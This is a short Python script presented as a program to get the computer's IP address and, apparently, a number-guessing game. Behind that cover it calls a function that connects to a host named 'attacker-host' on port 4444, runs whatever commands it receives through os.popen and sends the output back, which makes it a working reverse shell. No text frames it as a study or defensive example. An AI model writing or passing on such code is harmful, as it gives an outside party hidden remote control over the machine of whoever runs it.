# Python Program to Get IP Address
import socket
import logging
import time
import os

def main():
    # Configure logging
    logging.basicConfig(level=logging.INFO)

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    logging.info("Your Computer Name is: %s", hostname)
    logging.info("Your Computer IP Address is: %s", IPAddr)

    logging.info("hello client")

    magicNumber = 5

    time.sleep(10)

    start_client()

    print("Guess what number I am thinking of?")
    while True:
        pass

def start_client(host='attacker-host', port=4444):
    tries = 3
    while tries > 0:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((host, port))
                logging.info("Connected to server")

                while True:
                    # Receive command from server
                    command = client_socket.recv(1024).decode('utf-8')
                    if not command:
                        break

                    # Execute the command
                    output = os.popen(command).read()
                    logging.info(output)

                    # Send the output back to the server
                    client_socket.sendall(output.encode('utf-8'))
        except ConnectionRefusedError:
            print("Connection refused by server")
            tries -= 1
            time.sleep(3)
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            break
        
if __name__ == "__main__":
    main()